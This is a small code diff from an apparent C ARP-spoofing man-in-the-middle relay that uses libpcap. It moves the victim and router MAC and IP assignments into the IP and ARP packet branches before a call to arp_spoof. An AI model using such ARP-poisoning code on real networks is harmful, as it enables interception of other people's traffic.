@@ -180,8 +180,7 @@ int arp_spoof(u_int8_t *src_mac, u_int32_t src_ip, const struct sniff_ethernet *
 void relayer_got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
 	printf("Sending response from victim to attacker\n");
 											      
-	u_int8_t *src_mac = r_mac;
-	u_int32_t src_ip = r_ip;			      
+			      
 	const struct sniff_ethernet *ethernet;
 	ethernet = strip_ethernet(header, packet);
 	struct ether_header *eptr = (struct ether_header *) packet;
@@ -191,6 +190,8 @@ void relayer_got_packet(u_char *args, const struct pcap_pkthdr *header, const u_
         printf("Ethernet type hex:%x dec:%d is an IP packet\n",
                 ntohs(eptr->ether_type),
                 ntohs(eptr->ether_type));
+		u_int8_t *src_mac = v_mac;
+		u_int32_t src_ip = v_ip;	
 		const struct sniff_ip *ip;
 		ip = strip_ip(header, packet);
 		const u_char *payload;
@@ -211,6 +212,8 @@ void relayer_got_packet(u_char *args, const struct pcap_pkthdr *header, const u_
         printf("Ethernet type hex:%x dec:%d is an ARP packet\n",
                 ntohs(eptr->ether_type),
                 ntohs(eptr->ether_type));
+		u_int8_t *src_mac = r_mac;
+		u_int32_t src_ip = r_ip;		
 		const struct sniff_arp *arp;
 		arp = strip_arp(header, packet);
 		arp_spoof(src_mac, src_ip, ethernet, arp);
